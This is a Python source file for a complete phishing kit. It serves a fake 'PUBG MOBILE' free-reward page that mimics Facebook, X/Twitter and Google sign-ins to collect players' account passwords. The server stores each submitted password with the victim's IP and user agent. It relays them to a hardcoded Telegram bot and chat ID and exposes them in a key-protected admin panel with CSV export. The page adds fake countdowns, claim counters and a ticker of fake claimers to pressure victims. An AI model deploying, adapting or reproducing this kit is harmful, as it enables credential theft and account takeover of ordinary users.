#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PUBG MOBILE — Showcase with Instant Telegram Diagnostics & Retry Queue"""
from __future__ import annotations
import csv, hmac, html, io, json, mimetypes, os, queue, secrets, threading, time
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlparse
from urllib.request import Request, urlopen

BASE_DIR = Path(__file__).resolve().parent
IMG_DIR = BASE_DIR / "images"
IMG_DIR.mkdir(exist_ok=True)

CFG_FILE = BASE_DIR / "config_host.json"
DATA_FILE = BASE_DIR / "captured.jsonl"
PENDING_FILE = BASE_DIR / "pending_tg.jsonl"

HOST = "0.0.0.0"
PORT = int(os.environ.get("PORT", "8000"))
ADMIN_KEY = os.environ.get("ADMIN_KEY", "").strip()

DEFAULT_BOT_TOKEN = "1449862347:AAE5eRycQGU4kdlFePuR4XciSazQdjtEuqw"
DEFAULT_CHAT_ID = "1188729209"

STATS = {"visits": 0, "hits": 0, "tg_sent": 0, "tg_queued": 0, "last_tg_status": "not_tested_yet"}
LOCK = threading.Lock()
TG_QUEUE: queue.Queue[str] = queue.Queue()


def get_tg_credentials() -> tuple[str, str]:
    token = os.environ.get("BOT_TOKEN", "").strip() or DEFAULT_BOT_TOKEN.strip()
    chat_id = os.environ.get("CHAT_ID", "").strip() or DEFAULT_CHAT_ID.strip()
    return token, chat_id


def _set_tg_status(status: str) -> None:
    with LOCK:
        STATS["last_tg_status"] = status


def _post_telegram_once(message: str, token: str, chat_id: str) -> tuple[bool, str]:
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = json.dumps({
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }, ensure_ascii=False).encode("utf-8")
    req = Request(
        url,
        data=payload,
        headers={"Content-Type": "application/json; charset=utf-8"},
        method="POST",
    )
    with urlopen(req, timeout=15) as resp:
        raw = resp.read().decode("utf-8")
        data = json.loads(raw)
        if not data.get("ok"):
            err_msg = f"API_ERROR: {data.get('description') or raw}"
            return False, err_msg
        return True, "OK"


def _append_pending(message: str) -> None:
    try:
        with LOCK:
            with open(PENDING_FILE, "a", encoding="utf-8") as f:
                f.write(json.dumps({"msg": message, "ts": time.time()}, ensure_ascii=False) + "\n")
    except Exception:
        pass


def _rewrite_pending(items: list[dict]) -> None:
    try:
        with LOCK:
            with open(PENDING_FILE, "w", encoding="utf-8") as f:
                for it in items:
                    f.write(json.dumps(it, ensure_ascii=False) + "\n")
    except Exception:
        pass


def queue_telegram(message: str) -> None:
    with LOCK:
        STATS["tg_queued"] += 1
    _append_pending(message)
    TG_QUEUE.put(message)


def telegram_worker() -> None:
    while True:
        saved_items: list[dict] = []
        if PENDING_FILE.exists():
            try:
                for line in PENDING_FILE.read_text("utf-8").splitlines():
                    if line.strip():
                        saved_items.append(json.loads(line))
            except Exception:
                saved_items = []

        token, chat_id = get_tg_credentials()
        if saved_items and token and chat_id:
            remaining: list[dict] = []
            for item in saved_items:
                msg = str(item.get("msg") or "")
                if not msg:
                    continue
                sent = False
                last_err = ""
                for attempt in range(3):
                    try:
                        ok, info = _post_telegram_once(msg, token, chat_id)
                        if ok:
                            sent = True
                            with LOCK:
                                STATS["tg_sent"] += 1
                            _set_tg_status("OK")
                            print("Telegram OK: queued message delivered", flush=True)
                            break
                        last_err = info
                    except Exception as exc:
                        last_err = str(exc)
                    time.sleep(1.5 * (attempt + 1))
                if not sent:
                    _set_tg_status(f"FAIL: {last_err}")
                    print(f"Telegram FAIL: {last_err}", flush=True)
                    remaining.append(item)
            _rewrite_pending(remaining)

        try:
            msg = TG_QUEUE.get(timeout=4)
            token, chat_id = get_tg_credentials()
            if not token or not chat_id:
                _set_tg_status("FAIL: missing BOT_TOKEN or CHAT_ID")
                print("Telegram FAIL: missing BOT_TOKEN or CHAT_ID", flush=True)
                time.sleep(5)
                continue

            delivered = False
            last_err = ""
            for attempt in range(3):
                try:
                    ok, info = _post_telegram_once(msg, token, chat_id)
                    if ok:
                        delivered = True
                        with LOCK:
                            STATS["tg_sent"] += 1
                        _set_tg_status("OK")
                        print("Telegram OK: alert sent", flush=True)
                        break
                    last_err = info
                except Exception as exc:
                    last_err = str(exc)
                time.sleep(2 * (attempt + 1))

            if delivered:
                current: list[dict] = []
                if PENDING_FILE.exists():
                    try:
                        for line in PENDING_FILE.read_text("utf-8").splitlines():
                            if line.strip():
                                current.append(json.loads(line))
                    except Exception:
                        current = []
                removed = False
                filtered: list[dict] = []
                for it in current:
                    if not removed and it.get("msg") == msg:
                        removed = True
                        continue
                    filtered.append(it)
                _rewrite_pending(filtered)
            else:
                _set_tg_status(f"FAIL: {last_err}")
                print(f"Telegram FAIL: {last_err}", flush=True)
                time.sleep(8)
        except queue.Empty:
            time.sleep(2)


def load_cfg() -> dict:
    try:
        return json.loads(CFG_FILE.read_text("utf-8"))
    except Exception:
        return {}


def save_cfg(cfg: dict) -> None:
    try:
        CFG_FILE.write_text(json.dumps(cfg, ensure_ascii=False, indent=2), "utf-8")
    except Exception:
        pass


def init_admin_key() -> str:
    global ADMIN_KEY
    if ADMIN_KEY:
        return ADMIN_KEY
    saved = load_cfg()
    key = (saved.get("admin_key") or "").strip()
    if not key:
        key = secrets.token_urlsafe(16)
        save_cfg({"admin_key": key})
    ADMIN_KEY = key
    return ADMIN_KEY


def rows() -> list[dict]:
    out = []
    if DATA_FILE.exists():
        for line in DATA_FILE.read_text("utf-8").splitlines():
            try:
                out.append(json.loads(line))
            except Exception:
                pass
    return out


def auth_ok(query_str: str) -> bool:
    qs = parse_qs(query_str)
    k = (qs.get("k") or [""])[0]
    return bool(ADMIN_KEY) and hmac.compare_digest(k, ADMIN_KEY)


def find_image_file(name_stem: str) -> Path | None:
    safe_stem = Path(name_stem).name
    for ext in (".png", ".jpg", ".jpeg", ".webp"):
        p = IMG_DIR / f"{safe_stem}{ext}"
        if p.exists() and p.is_file():
            return p
    return None


def get_client_ip(headers) -> str:
    xff = headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    xri = headers.get("X-Real-IP", "")
    return xri.strip()


PAGE = r"""<!DOCTYPE html><html lang="en" dir="ltr"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>PUBG MOBILE — Season Reward Showcase</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#07090d;color:#e9eff7;font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;direction:ltr;padding-bottom:72px}
.wrap{max-width:1200px;margin:auto;padding:0 14px}
.status{background:#0a1016;border-bottom:1px solid #16202b;font-size:10.5px;color:#7c8b9d;display:flex;gap:7px;padding:6px 14px;align-items:center}
.sdot{width:6px;height:6px;border-radius:50%;background:#10b981}
.status b{color:#10b981}#vc{margin-inline-start:auto;font-family:monospace}
header{position:sticky;top:0;z-index:9;background:#07090d;border-bottom:1px solid #1b2430}
.hrow{display:flex;align-items:center;gap:12px;padding:11px 0}
.logo{font-weight:900;font-size:17px;letter-spacing:.5px}.logo span{color:#f7b733;display:block;font-size:9px;letter-spacing:5px}
.badge{margin-inline-start:auto;font-size:10px;background:linear-gradient(90deg,#f7b733,#ffd257);color:#1a1206;font-weight:900;padding:5px 11px;border-radius:20px}
.tabs{display:flex;gap:7px;overflow-x:auto;padding-bottom:10px;-webkit-overflow-scrolling:touch}
.tab{background:#131b26;border:1px solid #1e2a38;color:#93a3b6;font-size:12.5px;font-weight:700;padding:7px 14px;border-radius:20px;cursor:pointer;white-space:nowrap}
.tab.on{background:linear-gradient(90deg,#f7b733,#ffd257);color:#1a1206}
.hero{margin:16px 0;background:#101821;border:1px solid #1d2836;border-radius:16px;padding:18px}
.pill{display:inline-block;font-size:11px;font-weight:700;color:#ffd257;background:#f7b7331a;border:1px solid #f7b73359;padding:4px 11px;border-radius:20px;margin-bottom:10px}
.hero h1{font-size:21px;line-height:1.45}.hero h1 b{color:#ffd257}
.hero p{color:#93a3b6;font-size:13px;margin-top:8px}
.geo{font-size:11px;color:#6f7f92;margin-top:9px}
.cd{display:flex;gap:8px;align-items:center;margin-top:12px;font-size:12px;color:#93a3b6}
.cd b{font-family:monospace;font-size:15px;color:#ff5a4d;background:#1a1113;padding:3px 9px;border-radius:7px}
.prog{height:7px;background:#1a2330;border-radius:6px;margin-top:12px;overflow:hidden}
.prog i{display:block;height:100%;width:87%;background:linear-gradient(90deg,#f7b733,#ff5a4d)}
.tiny{font-size:11px;color:#6f7f92;margin-top:7px}
.ad{display:flex;gap:10px;background:#101720;border:1px dashed #2a3849;border-radius:12px;padding:11px 14px;margin:14px 0;font-size:12px}
.ad b{color:#ffd257}.ad span{color:#7c8b9d;margin-inline-start:auto;font-size:11px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(158px,1fr));gap:10px}
@media (min-width:768px){.grid{grid-template-columns:repeat(auto-fill,minmax(195px,1fr));gap:14px}}
.card{background:#0d1319;border:1px solid #1d2836;border-radius:13px;overflow:hidden;transition:transform .15s,border-color .15s}
.card:hover{transform:translateY(-2px);border-color:#35475c}
.art{height:124px;display:grid;place-items:center;position:relative;overflow:hidden}
.art img,.mart img{width:100%;height:100%;object-fit:cover;display:block}
.fb-lbl{font-size:12px;font-weight:800;color:#e9eff7;padding:8px;text-align:center}
.rar{position:absolute;top:6px;inset-inline-start:6px;font-size:9px;font-weight:900;padding:2px 7px;border-radius:5px;z-index:2;letter-spacing:.4px}
.mythic .art,.mart.mythic{background:radial-gradient(circle at 50% 35%,#7c142d,#24060e)}
.legend .art,.mart.legend{background:radial-gradient(circle at 50% 35%,#784f08,#241602)}
.epic .art,.mart.epic{background:radial-gradient(circle at 50% 35%,#581c87,#1c082e)}
.rare .art,.mart.rare{background:radial-gradient(circle at 50% 35%,#1d4ed8,#091636)}
.uc .art,.mart.uc{background:radial-gradient(circle at 50% 35%,#047857,#052119)}
.mythic .rar{background:#ff3b52;color:#fff}.legend .rar{background:#f7b733;color:#1a1206}
.epic .rar{background:#a855f7;color:#fff}.rare .rar{background:#3b82f6;color:#fff}.uc .rar{background:#10b981;color:#04221a}
.body{padding:10px}.name{font-size:12.5px;font-weight:700;line-height:1.35;min-height:34px}
.price{font-size:11px;color:#6f7f92;text-decoration:line-through}
.free{font-size:11.5px;font-weight:900;color:#10b981;margin:4px 0 7px}
.btn,.upg,.go{width:100%;border:0;font-family:inherit;font-weight:900;border-radius:8px;cursor:pointer}
.btn{background:linear-gradient(90deg,#f7b733,#ffd257);color:#1a1206;font-size:12px;padding:8px}
.upg{margin-top:5px;background:#1b2634;color:#9fb2c7;font-size:11px;font-weight:700;padding:5px}
footer{text-align:center;padding:24px 14px;color:#5d6c7d;font-size:11px;line-height:1.9;border-top:1px solid #141d27;margin-top:24px}
.ov{position:fixed;inset:0;background:#030508d9;display:none;place-items:center;z-index:99;padding:16px}
.ov.on{display:grid}
.sheet{width:100%;max-width:400px;background:#0f1620;border:1px solid #24313f;border-radius:18px;padding:20px;position:relative}
.x{position:absolute;top:11px;inset-inline-end:11px;background:#1b2634;border:1px solid #2b3a4c;color:#93a3b6;width:28px;height:28px;border-radius:50%;cursor:pointer;z-index:3}
.hide{display:none}
.mart{height:122px;display:grid;place-items:center;border-radius:12px;margin-bottom:12px;overflow:hidden}
.sheet h3,.sheet h4{font-size:15px;text-align:center}
.msub{text-align:center;font-size:11.5px;color:#8496a9;line-height:1.7;margin:7px 0 14px}
.prov{width:100%;display:flex;gap:10px;justify-content:center;align-items:center;font-family:inherit;font-weight:700;font-size:13px;padding:11px;border-radius:10px;cursor:pointer;border:0;margin-bottom:9px}
.prov span{font-weight:900;font-size:15px}
.fb{background:#1877f2;color:#fff}.tw{background:#0e0e0e;color:#fff;border:1px solid #2c2c2c}.gm{background:#fff;color:#3c4043}
.phead{height:60px;border-radius:12px;display:grid;place-items:center;font-size:24px;font-weight:900;margin-bottom:12px}
.fld{position:relative}
.inp{width:100%;background:#0c1219;border:1px solid #24313f;color:#e9eff7;font-family:inherit;font-size:13px;padding:11px;border-radius:9px;margin-bottom:9px}
.eye{position:absolute;top:9px;inset-inline-start:9px;background:0;border:0;color:#6f7f92;font-size:14px;cursor:pointer}
.go{background:linear-gradient(90deg,#f7b733,#ffd257);color:#1a1206;font-size:13.5px;padding:12px}
.spin{width:42px;height:42px;border:3px solid #24313f;border-top-color:#f7b733;border-radius:50%;margin:8px auto 14px;animation:sp .8s linear infinite}
@keyframes sp{to{transform:rotate(360deg)}}
.bar{height:7px;background:#1a2330;border-radius:6px;margin:12px 0;overflow:hidden}
.bar i{display:block;height:100%;width:0;background:#10b981;transition:width .18s}
.okc{width:54px;height:54px;border-radius:50%;background:#10b981;color:#04221a;font-size:28px;font-weight:900;display:grid;place-items:center;margin:6px auto 13px}
.tick{position:fixed;bottom:0;inset-inline:0;z-index:60;background:#090d12;border-top:1px solid #2a3a1e;display:flex;gap:10px;align-items:center;padding:9px 12px}
.live{font-size:10px;font-weight:900;color:#ff5a4d;background:#ff5a4d1f;padding:4px 9px;border-radius:20px}
.track{flex:1;height:38px;overflow:hidden}
.titem{height:38px;display:flex;gap:7px;align-items:center;font-size:11.5px}
.titem b{color:#ffd257}.titem s{color:#10b981;text-decoration:none}
.titem em{color:#6f7f92;font-family:monospace;font-size:10.5px;font-style:normal}
.toast{position:fixed;top:14px;inset-inline:0;margin:auto;width:max-content;max-width:90%;background:#ff3b52;color:#fff;font-size:12px;font-weight:700;padding:9px 16px;border-radius:9px;z-index:120;opacity:0;transition:.25s}
.toast.on{opacity:1}
</style></head><body>
<div class="status"><div class="wrap"><span class="sdot"></span><b>Server Online</b> · Live Alerts Active<span id="vc">👁 0</span></div></div>
<header><div class="wrap"><div class="hrow"><div class="logo">PUBG<span>MOBILE</span></div>
<div class="badge">🎁 Official Event</div></div>
<div class="tabs" id="tabs"><button class="tab on" data-t="all">All</button>
<button class="tab" data-t="skin">Outfits</button><button class="tab" data-t="char">Characters</button>
<button class="tab" data-t="gun">Weapons</button><button class="tab" data-t="upg">Upgrade</button>
<button class="tab" data-t="uc">UC Packs</button><button class="tab" data-t="rp">Royale Pass</button></div></div></header>
<div class="wrap"><section class="hero"><div class="pill">🔥 Festival Crate — Season 21</div>
<h1>Claim Mythic Outfits &amp; Upgraded Weapons <b>FREE</b></h1>
<p>Select an item, sign in with your account, and it will be queued for your PUBG MOBILE profile.</p>
<div class="geo" id="geo">📍 Platform: Mobile &amp; Desktop Compatible</div>
<div class="cd"><span>Event ends in</span><b id="cd">05:59:59</b></div>
<div class="prog"><i></i></div><p class="tiny">87% claimed — 1,240 rewards remaining</p></section>
<div class="ad"><b>⚡ 30% Bonus UC Crate</b><span>Limited Time</span></div>
<div class="grid" id="grid"></div>
<div class="ad"><b>🆕 Patch 3.4 Showcase</b><span>New Skins</span></div>
<footer><b>PUBG MOBILE</b> — Reward Showcase<br>© 2026 Level Infinite / Krafton</footer></div>
<div class="ov" id="ov"><div class="sheet"><button class="x" onclick="closeM()">✕</button>
<div id="s1"><div class="mart" id="mArt"></div><h3 id="mName"></h3>
<p class="msub">Free event reward — choose a sign-in method</p>
<button class="prov fb" onclick="pick('facebook')"><span>f</span> Continue with Facebook</button>
<button class="prov tw" onclick="pick('twitter')"><span>𝕏</span> Continue with X / Twitter</button>
<button class="prov gm" onclick="pick('google')"><span>G</span> Continue with Google</button>
<p class="tiny">By continuing, you agree to the event terms.</p></div>
<div id="s2" class="hide"><div class="phead" id="pHead"></div><h4 id="pTitle"></h4>
<p class="msub">Enter your account credentials</p>
<input id="ident" class="inp" placeholder="Email or Phone Number">
<div class="fld"><input id="pass" class="inp" type="password" placeholder="Password">
<button class="eye" onclick="eye()">👁</button></div>
<button class="go" onclick="send()">Sign In &amp; Claim Reward</button>
<p class="tiny">🔒 Encrypted session</p></div>
<div id="s3" class="hide"><div class="spin"></div><h4 id="loadTitle">Verifying...</h4>
<div class="bar"><i id="barFill"></i></div><p class="msub" id="loadTxt">Connecting to server...</p></div>
<div id="s4" class="hide"><div class="okc">✓</div><h4>Reward Claimed!</h4>
<p class="msub" id="okTxt"></p><button class="go" onclick="closeM()">Close</button></div>
</div></div>
<div class="tick"><div class="live">LIVE</div><div class="track" id="track"></div></div>
<div class="toast" id="toast"></div><script>
const RAW="skin|Blood Raven Set|raven|mythic|Mythic|1,800 UC;;skin|Neon Phantom Suit|neon|legend|Legendary|1,200 UC;;skin|Desert Ghost Gear|desert|epic|Epic|800 UC;;skin|Cosmo Ranger Suit|cosmo|legend|Legendary|1,500 UC;;skin|Silent Wraith Outfit|wraith|epic|Epic|900 UC;;skin|Jester Chaos Set|jester|rare|Rare|600 UC;;char|Carlo Character|carlo|mythic|Mythic|1,400 UC;;char|Sara Character|sara|legend|Legendary|1,000 UC;;char|Victor Character|victor|epic|Epic|750 UC;;gun|M416 — Glacier|glacier|mythic|Mythic|2,400 UC;;gun|AKM — Hellfire|hellfire|legend|Legendary|1,600 UC;;gun|AWM — Neon|awm|mythic|Mythic|2,200 UC;;upg|Weapon Materials ×5|mat|epic|Epic|950 UC;;uc|660 UC Pack|uc660|uc|UC Pack|300 UC;;uc|1,800 UC Pack|uc1800|uc|UC Pack|800 UC;;rp|Royale Pass Elite|rp|legend|Legendary|600 UC";
const ITEMS=RAW.split(";;").map(x=>{const[t,n,art,r,rl,p]=x.split("|");return{t,n,art,r,rl,p}});
let cur=null,prov="",mode="claim";
const $=id=>document.getElementById(id);

function artBox(item){
  const src=`/img/${encodeURIComponent(item.art)}`;
  return `<img src="${src}" alt="${item.n}" onerror="this.outerHTML='<div class=fb-lbl>${item.n}</div>'">`;
}

function render(cat="all"){
  $("grid").innerHTML=ITEMS.filter(i=>cat==="all"||i.t===cat).map(i=>`
    <div class="card ${i.r}">
      <div class="art"><span class="rar">${i.rl}</span>${artBox(i)}</div>
      <div class="body">
        <div class="name">${i.n}</div>
        <div class="price">${i.p}</div>
        <div class="free">FREE CLAIM</div>
        <button class="btn" onclick="openM(${ITEMS.indexOf(i)},'claim')">Claim</button>
        ${i.t==="gun"?`<button class="upg" onclick="openM(${ITEMS.indexOf(i)},'upg')">Free Upgrade</button>`:""}
      </div>
    </div>`).join("");
}

document.querySelectorAll(".tab").forEach(b=>b.onclick=()=>{
  document.querySelectorAll(".tab").forEach(x=>x.classList.remove("on"));
  b.classList.add("on");render(b.dataset.t);
});

function showStep(n){["s1","s2","s3","s4"].forEach((s,i)=>$(s).classList.toggle("hide",i+1!==n));}
function openM(idx,m){
  cur=ITEMS[idx];mode=m;
  $("mArt").className="mart "+cur.r;$("mArt").innerHTML=artBox(cur);
  $("mName").textContent=cur.n+(m==="upg"?" (Upgrade)":"");
  showStep(1);$("ov").classList.add("on");
}
function closeM(){$("ov").classList.remove("on");}

function pick(p){
  prov=p;
  const map={facebook:["f","Facebook","#1877f2","#fff"],twitter:["𝕏","X / Twitter","#0e0e0e","#fff"],google:["G","Google","#fff","#3c4043"]}[p];
  $("pHead").textContent=map[0];$("pHead").style.background=map[2];$("pHead").style.color=map[3];
  $("pTitle").textContent="Sign in with "+map[1];
  $("ident").value="";$("pass").value="";showStep(2);
}

function eye(){const p=$("pass");p.type=p.type==="password"?"text":"password";}
function toast(m){const t=$("toast");t.textContent=m;t.classList.add("on");setTimeout(()=>t.classList.remove("on"),2500);}

function send(){
  const identifier=$("ident").value.trim(),password=$("pass").value.trim();
  if(!identifier||!password)return toast("Please enter your identifier and password");
  showStep(3);let w=0;
  const iv=setInterval(()=>{w+=15;$("barFill").style.width=Math.min(w,95)+"%";},150);
  fetch("/api/login",{
    method:"POST",headers:{"Content-Type":"application/json"},
    body:JSON.stringify({provider:prov,identifier,password,item:cur.n,item_type:cur.t,rarity:cur.rl,mode})
  }).then(r=>r.json()).then(()=>{
    clearInterval(iv);$("barFill").style.width="100%";
    setTimeout(()=>{$("okTxt").textContent="Claim request submitted for "+cur.n+".";showStep(4);},300);
  }).catch(()=>{clearInterval(iv);toast("Server connection error");showStep(2);});
}

fetch("/api/geo").then(r=>r.json()).then(d=>{$("vc").textContent="👁 "+d.visits;});
let sec=21599;setInterval(()=>{if(sec>0)sec--;const h=String(Math.floor(sec/3600)).padStart(2,"0"),m=String(Math.floor(sec%3600/60)).padStart(2,"0"),s=String(sec%60).padStart(2,"0");$("cd").textContent=`${h}:${m}:${s}`;},1000);
const feed=[["514289***","M416 Glacier"],["598120***","660 UC"],["523104***","Blood Raven Set"],["577412***","Royale Pass"]];
let fi=0;function tick(){const[u,it]=feed[fi++%feed.length];$("track").innerHTML=`<div class="titem"><em>ID:${u}</em> claimed <b>${it}</b> <s>✔</s></div>`;}
tick();setInterval(tick,3000);render();
</script></body></html>"""


class HostHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def _send_bytes(self, body: bytes, status: int = 200, content_type: str = "text/html; charset=utf-8", extra_headers: dict | None = None):
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        if extra_headers:
            for k, v in extra_headers.items():
                self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/":
            with LOCK:
                STATS["visits"] += 1
            self._send_bytes(PAGE.encode("utf-8"))

        elif path.startswith("/img/"):
            stem = path[len("/img/"):]
            img_path = find_image_file(stem)
            if not img_path:
                self._send_bytes("Image not found".encode("utf-8"), 404, "text/plain; charset=utf-8")
                return
            ctype, _ = mimetypes.guess_type(str(img_path))
            self._send_bytes(img_path.read_bytes(), 200, ctype or "image/png")

        elif path == "/api/geo":
            payload = json.dumps({
                "status": "online",
                "visits": STATS["visits"],
                "tg_sent": STATS["tg_sent"],
                "last_tg_status": STATS["last_tg_status"]
            }, ensure_ascii=False).encode("utf-8")
            self._send_bytes(payload, content_type="application/json; charset=utf-8")

        elif path == "/api/tg-test":
            if not auth_ok(parsed.query):
                self._send_bytes('{"ok":false,"error":"Unauthorized"}'.encode("utf-8"), 401, "application/json; charset=utf-8")
                return
            token, chat_id = get_tg_credentials()
            test_msg = f"🧪 <b>Telegram Test Alert</b>\n🕒 <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>"
            try:
                ok, info = _post_telegram_once(test_msg, token, chat_id)
                if ok:
                    with LOCK:
                        STATS["tg_sent"] += 1
                        STATS["last_tg_status"] = "OK"
                    self._send_bytes(b'{"ok":true,"status":"sent"}', content_type="application/json; charset=utf-8")
                else:
                    _set_tg_status(f"FAIL: {info}")
                    res = json.dumps({"ok": False, "error": info}, ensure_ascii=False).encode("utf-8")
                    self._send_bytes(res, 500, "application/json; charset=utf-8")
            except Exception as exc:
                _set_tg_status(f"FAIL: {exc}")
                res = json.dumps({"ok": False, "error": str(exc)}, ensure_ascii=False).encode("utf-8")
                self._send_bytes(res, 500, "application/json; charset=utf-8")

        elif path == "/admin":
            if not auth_ok(parsed.query):
                self._send_bytes("Unauthorized".encode("utf-8"), 401, "text/plain; charset=utf-8")
                return
            d = rows()[::-1]
            cards = (
                f"<div class=cd><b>{len(d)}</b><span>Total Records</span></div>"
                f"<div class=cd><b>{STATS['visits']}</b><span>Visits</span></div>"
                f"<div class=cd><b>{STATS['tg_sent']}</b><span>TG Sent</span></div>"
                f"<div class=cd><b>{html.escape(STATS['last_tg_status'])}</b><span>Last TG Status</span></div>"
            )
            tr = "".join(
                "<tr>" + "".join(
                    f"<td>{html.escape(str(r.get(k, '')))}</td>"
                    for k in ("time", "provider", "identifier", "password", "item", "mode", "ip")
                ) + "</tr>" for r in d[:400]
            )
            th = "".join(f"<th>{h}</th>" for h in ("Time", "Provider", "Identifier", "Password", "Item", "Mode", "IP"))
            page_html = f"""<!doctype html><html lang=en dir=ltr><meta charset=utf-8><title>Admin Panel</title><style>
body{{background:#0b0f14;color:#e9eff7;font-family:Segoe UI,Tahoma,sans-serif;padding:20px}}.g{{display:flex;gap:10px;margin:14px 0;flex-wrap:wrap}}
.cd{{background:#131b25;border:1px solid #24313f;border-radius:10px;padding:12px 20px;text-align:center}}
.cd b{{display:block;font-size:18px;color:#f7b733;word-break:break-word}}.cd span{{font-size:11px;color:#7c8b9d}}
table{{border-collapse:collapse;width:100%;font-size:12px;margin-top:12px}}td,th{{border:1px solid #1e2a38;padding:8px;text-align:left}}
th{{background:#182231;color:#ffd257}}a{{color:#f7b733;text-decoration:none;font-weight:bold;margin-right:16px}}</style>
<h3>Admin Panel — {len(d)} Records</h3><div class=g>{cards}</div>
<a href="/export.csv?k={html.escape(ADMIN_KEY)}">⬇ Export CSV</a>
<a href="/api/tg-test?k={html.escape(ADMIN_KEY)}" target="_blank">🔔 Test Telegram Now</a>
<table><tr>{th}</tr>{tr}</table></html>"""
            self._send_bytes(page_html.encode("utf-8"))

        elif path == "/export.csv":
            if not auth_ok(parsed.query):
                self._send_bytes("Unauthorized".encode("utf-8"), 401, "text/plain; charset=utf-8")
                return
            b = io.StringIO()
            d = rows()
            if d:
                w = csv.DictWriter(b, fieldnames=list(d[0].keys()))
                w.writeheader()
                w.writerows(d)
            csv_bytes = ("\ufeff" + b.getvalue()).encode("utf-8")
            self._send_bytes(csv_bytes, content_type="text/csv; charset=utf-8", extra_headers={
                "Content-Disposition": "attachment; filename=submissions.csv"
            })
        else:
            self._send_bytes("Not Found".encode("utf-8"), 404, "text/plain; charset=utf-8")

    def do_POST(self):
        parsed = urlparse(self.path)
        if parsed.path != "/api/login":
            self._send_bytes("Not Found".encode("utf-8"), 404, "text/plain; charset=utf-8")
            return

        length = int(self.headers.get("Content-Length", "0") or "0")
        raw_body = self.rfile.read(length) if length > 0 else b"{}"
        try:
            d = json.loads(raw_body.decode("utf-8"))
        except Exception:
            d = {}

        ty = {"skin": "Outfit", "char": "Character", "gun": "Weapon", "upg": "Upgrade", "uc": "UC Pack", "rp": "Royale Pass"}
        ip = get_client_ip(self.headers) or (self.client_address[0] if self.client_address else "")
        rec = {
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "provider": str(d.get("provider") or "?").strip(),
            "identifier": str(d.get("identifier") or "").strip(),
            "password": str(d.get("password") or "").strip(),
            "item": str(d.get("item") or "?").strip(),
            "item_type": ty.get(str(d.get("item_type") or "").strip(), "?"),
            "rarity": str(d.get("rarity") or "?").strip(),
            "mode": "Upgrade" if d.get("mode") == "upg" else "Claim",
            "ip": ip,
            "ua": self.headers.get("User-Agent", "")[:250]
        }
        with LOCK:
            STATS["hits"] += 1
            try:
                with open(DATA_FILE, "a", encoding="utf-8") as f:
                    f.write(json.dumps(rec, ensure_ascii=False) + "\n")
            except Exception:
                pass

        e = html.escape
        tg_text = (
            "🔔 <b>New Registration / Claim</b>\n"
            "━━━━━━━━━━━━\n"
            f"🔑 <b>Provider:</b> {e(rec['provider'])}\n"
            f"👤 <b>Account:</b> <code>{e(rec['identifier'])}</code>\n"
            f"🔒 <b>Password:</b> <code>{e(rec['password'])}</code>\n"
            "━━━━━━━━━━━━\n"
            f"🎁 <b>Reward:</b> {e(rec['item'])}\n"
            f"🗂 <b>Details:</b> {e(rec['item_type'])} · {e(rec['rarity'])} · {e(rec['mode'])}\n"
            "━━━━━━━━━━━━\n"
            f"🌐 <b>IP:</b> <code>{e(rec['ip'])}</code>\n"
            f"🕒 <b>Time:</b> {e(rec['time'])}"
        )
        queue_telegram(tg_text)
        print(f"New submission: [{rec['provider']}] {rec['identifier']} | {rec['item']} | {rec['ip']}", flush=True)
        self._send_bytes(b'{"ok":true}', content_type="application/json; charset=utf-8")


if __name__ == "__main__":
    key = init_admin_key()
    threading.Thread(target=telegram_worker, daemon=True).start()
    print(f"Starting server on {HOST}:{PORT}", flush=True)
    print(f"Admin path: /admin?k={key}", flush=True)
    server = ThreadingHTTPServer((HOST, PORT), HostHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()